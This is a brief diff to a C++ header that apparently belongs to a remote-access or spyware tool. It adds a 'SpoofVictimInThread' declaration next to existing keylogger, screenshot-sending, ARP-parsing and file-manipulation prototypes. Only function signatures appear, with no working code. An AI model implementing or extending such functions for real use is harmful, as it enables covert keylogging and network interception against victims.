@@ -71,6 +71,7 @@ string DeleteGivenFile(string file);
 string UnHideFileOrFolder(string pathtofileorfolder);
 string MoveGivenFileToDestination(string pathtofile, string Destination);
 string SplitArpLine(string line);
+void SpoofVictimInThread(std::string ip);
 void KeyLogger();
 bool SpecialKeys(int S_Key);
 void SendPicture(string fileName, string cmd);
